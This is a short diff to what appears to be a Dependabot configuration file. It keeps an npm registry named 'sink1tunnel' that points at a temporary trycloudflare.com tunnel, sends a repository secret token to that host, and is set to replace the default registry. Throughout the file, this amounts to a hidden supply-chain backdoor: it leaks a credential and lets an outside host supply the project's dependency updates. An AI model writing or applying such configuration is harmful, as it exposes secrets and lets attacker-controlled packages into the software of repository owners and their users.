@@ -1,9 +1,9 @@
-# p7r p5e_5e_gs 1790620673
+# p7r p5e_5e_gsa 1790620797
 version: 2
 registries:
   sink1tunnel:
     type: npm-registry
-    url: https://rand-terms-bytes-subsidiaries.trycloudflare.com/redirc/gs
+    url: https://rand-terms-bytes-subsidiaries.trycloudflare.com/redirc/gsa
     token: ${{secrets.SINK1_TOKEN}}
     replaces-base: true
 updates:
